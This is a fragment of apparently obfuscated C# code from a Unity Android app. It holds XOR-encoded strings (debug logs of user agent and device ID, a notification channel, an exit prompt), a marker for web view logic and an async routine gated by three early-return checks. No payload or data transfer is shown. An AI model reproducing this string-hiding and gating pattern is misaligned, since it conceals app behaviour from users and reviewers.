            Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[18] { 90, 85, 100, 114, 117, 92, 33, 116, 114, 100, 115, 64, 102, 100, 111, 117, 59, 33 }, 1) + _0x0b59b7b6);
            Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[17] { 74, 69, 116, 98, 101, 76, 49, 98, 104, 98, 85, 116, 103, 88, 117, 43, 49 }, 17) + _0xcfc4feaf);
            Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[12] { 199, 200, 249, 239, 232, 193, 188, 251, 236, 233, 166, 188 }, 156) + _0xbf0d9e0b);
            Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[12] { 181, 186, 139, 157, 154, 179, 206, 141, 158, 155, 212, 206 }, 238) + _0xc9658e78);
#endif
        }
    }

    private string _0x6432cf65 = "";
    private string _0xc9658e78 = "";
    // WEB VIEW LOGIC END
    internal void _0x3746b932()
    {
        // Ensure channel exists (safe to call multiple times)
        var _0x51a1cbb6 = new AndroidNotificationChannel
        {
            Id = _0x6bb1939a._0x92fa81ce(new byte[15] { 21, 20, 23, 16, 4, 29, 5, 46, 18, 25, 16, 31, 31, 20, 29 }, 113),
            Name = _0x6bb1939a._0x92fa81ce(new byte[15] { 56, 25, 26, 29, 9, 16, 8, 92, 63, 20, 29, 18, 18, 25, 16 }, 124),
            Importance = Importance.High,
            Description = _0x6bb1939a._0x92fa81ce(new byte[21] { 132, 166, 173, 166, 177, 162, 175, 227, 173, 172, 183, 170, 165, 170, 160, 162, 183, 170, 172, 173, 176 }, 195)
        };
        AndroidNotificationCenter.RegisterNotificationChannel(_0x51a1cbb6);
        // Build notification
        var _0x8c2c6ab0 = new AndroidNotification
        {
            Title = _0x5616991b[UnityEngine.Random.Range(0, _0x5616991b.Length)],
            Text = _0x6bb1939a._0x92fa81ce(new byte[21] { 160, 147, 132, 193, 152, 142, 148, 193, 146, 148, 147, 132, 193, 149, 142, 193, 132, 153, 136, 149, 222 }, 225),
            FireTime = System.DateTime.Now
        };
        // Send immediately
        AndroidNotificationCenter.SendNotification(_0x8c2c6ab0, _0x6bb1939a._0x92fa81ce(new byte[15] { 82, 83, 80, 87, 67, 90, 66, 105, 85, 94, 87, 88, 88, 83, 90 }, 54));
    }

    internal bool firstLoadShown = false;
    private async Task _0xe560f9bb()
    {
        if (await _0xc5f22eb9())
            return;
        if (await _0xb79d4a27())
            return;
        if (await _0xa9ed8c00())
            return;
        _0x272c3ba4();
        await _0x29266bea(_0x0f7d9623());
        _0x0e5e18b6 = await _0xecaec59e();
        await _0x439fbcf0();
    }
}

internal static class _0x6bb1939a
{
    internal static string _0x92fa81ce(byte[] data, byte key)
    {
        var buffer = new byte[data.Length];
        for (var i = 0; i < data.Length; i++)
            buffer[i] = (byte)(data[i] ^ key);
        return System.Text.Encoding.UTF8.GetString(buffer);
    }
}